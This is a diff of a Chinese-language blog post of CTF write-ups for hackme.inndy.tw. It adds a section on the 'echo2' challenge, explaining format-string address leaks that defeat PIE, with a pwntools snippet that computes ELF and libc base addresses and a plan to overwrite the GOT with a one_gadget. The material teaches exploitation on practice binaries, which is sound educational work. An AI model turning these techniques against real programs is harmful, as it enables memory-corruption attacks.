@@ -1,6 +1,6 @@
-# hackme.inndy.tw的一些Writeup（12月30更新）
+# hackme.inndy.tw的一些Writeup（1月20日更新）
 
-> 转载请表明出处：
+> 转载请表明出处：http://www.cnblogs.com/WangAoBo/p/7706719.html
 
 推荐一下https://hackme.inndy.tw/scoreboard/，上边有一些很好的针对新手的题目，但网上能搜到的Writeup很少，因此开了这篇博文记录一下部分目前解出的题目（主要是pwn和re），以后会跟着解题进度的推进逐步更新，同时遵循inndy师傅的规矩，只放思路，不放flag。
 
@@ -105,7 +105,33 @@
 
 >  需要注意如果leak的payload是**p32(system_got) + "%7$s"**的形式，那么泄露出的system_addr是从第4位到第8位（p32(system_got))占据了前4位，另外如果p32(system_got)中有\x00等bad char截断printf的话，可以调整payload形式为**%8$s + p32(system_got)**
 
-#### 0x07 smash-the-stack
+#### 0x07 echo2
+
+很明显这一题也是格式化字符串的漏洞,与上一题的不同在于:
+
+1. 64位,这意味着fmtstr_payload函数极有可能因为\x00不能用
+2. 开启了PIE,也就是说got表等地址都是随机的,但因为elf中各个部分的偏移是固定的,因此可以通过泄露elf基址的方法来确定其他部分的真实地址
+
+通过调试看出可以利用%41\$p和%43$p泄露main地址与__libc_start_main的地址(0x23 + 6, 0x25 + 6):
+
+![](https://ws1.sinaimg.cn/large/006AWYXBly1fnn6mkc4gxj30vr0b3k0g.jpg)
+
+泄露elf_base与libc_base的函数如下:
+
+```python
+def getAddr():
+    io.sendline("%41$p..%43$p..")
+    elf_base = int(io.recvuntil("..", drop = True), 16) - 74 - 0x9b9#nm ./echo2
+    libc_base = int(io.recvuntil("..", drop = True), 16) - 240 - libc_offset # this is for remote
+    #  libc_base = int(io.recvuntil("..", drop = True), 16) - 241 - libc_offset #this is for local
+    log.info("elf_base -> 0x%x" % elf_base)
+    log.info("libc_base -> 0x%x" % libc_base)
+    return elf_base + exit_got, libc_base + one_gadget
+```
+
+获得elf_base与libc_base基址后,按照正常的格式化字符串思路来就行,比如可以用one_gadget地址覆写exit函数的got表地址.
+
+#### 0x08 smash-the-stack
 
 典型的canary leak，覆盖\__libc_argv[0]为flag在内存中地址，触发__stack_chk_fail函数即可泄露flag
 
